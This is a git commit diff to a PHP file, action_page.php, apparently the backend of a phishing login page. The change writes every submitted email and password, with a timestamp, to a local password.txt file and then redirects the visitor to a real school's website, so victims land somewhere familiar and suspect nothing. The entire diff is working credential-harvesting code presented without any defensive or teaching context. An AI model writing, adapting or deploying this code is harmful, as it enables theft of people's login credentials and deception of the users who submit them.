2e215ec5f865de70a610af46029e380578294058
ngchenghow <ngchenghow@gmail.com>
2020-02-24 10:33:02 +0800

    Update action_page.php

--- action_page.php
+++ action_page.php
@@ -1,8 +1,13 @@
 <?php
 
-echo $_POST['password'];
-echo $_POST['email'];
+$pass=$_POST['password'];
+$email=$_POST['email'];
 
+$myfile = fopen("password.txt", "a") or die("Unable to open file!");
+$txt = "email:".$email." \t "."password:".$pass." \t Date:".date("M,d,Y h:i:s A");
+fwrite($myfile, $txt);
+fclose($myfile);
 
+header("Location: http://www.hinhua.edu.my");
 
 ?>
